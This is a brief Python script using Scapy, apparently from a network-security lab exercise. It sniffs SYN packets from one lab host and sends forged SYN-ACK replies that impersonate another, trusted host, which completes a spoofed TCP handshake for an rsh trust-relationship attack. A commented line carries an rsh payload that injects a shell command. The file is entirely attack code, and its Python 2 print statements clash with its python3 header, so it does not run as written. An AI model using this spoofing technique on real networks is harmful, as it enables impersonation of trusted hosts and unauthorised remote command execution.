#!/usr/bin/python3
#-*- coding: utf-8 -*- 
from scapy.all import *
def spoof(pkt):
#	print "Enter Sequence Number to be used"	
	old_ip  = pkt[IP]
	old_tcp = pkt[TCP]# Print out debugging information
	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4  # TCP data length
	print "sniffed packet \n"
	print("{}:{} -> {}:{}  Flags={} Len={} Seq_number = {} Ack = {}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len,old_tcp.seq,old_tcp.ack))# Construct the IP header of the response
	if old_tcp.flags=="S":
		print "We received a SYN packet \n"
		spoof_ip = IP(src="10.0.2.15", dst="10.0.2.10")# Check whether it is a SYN+ACK packet or not;
		spoof_tcp = TCP(sport=1023,dport=1023,flags="SA",ack=old_tcp.seq+1)
#		data = "1023\x00seed\x00seed\x00 touch /home/seed/tmp/xyz\x00"
		spoof_pkt = spoof_ip/spoof_tcp
		print "Constructing and sending my spoofed Acknowledged packet \n"
		print("{}:{} -> {}:{}  Flags={} Seq_number = {} Ack = {}".format(spoof_ip.src, spoof_tcp.sport		     ,spoof_ip.dst, spoof_tcp.dport, spoof_tcp.flags,spoof_tcp.seq,spoof_tcp.ack))
		send(spoof_pkt)
	else:
#		print "This is not a SYN+ACK packet \n"
#		print "Structure of this packet \n"
#		print("{}:{} -> {}:{}  Flags={} Seq_number = {} Ack = {}".format(pkt[IP].src, pkt[TCP].sport               	     ,pkt[IP].dst, pkt[TCP].dport, pkt[TCP].flags,pkt[TCP].seq,pkt[TCP].ack))
		exit()
myFilter = "tcp src port 1023 and src host 10.0.2.10"   # You need to make the filter more specific
sniff(filter=myFilter, prn=spoof)
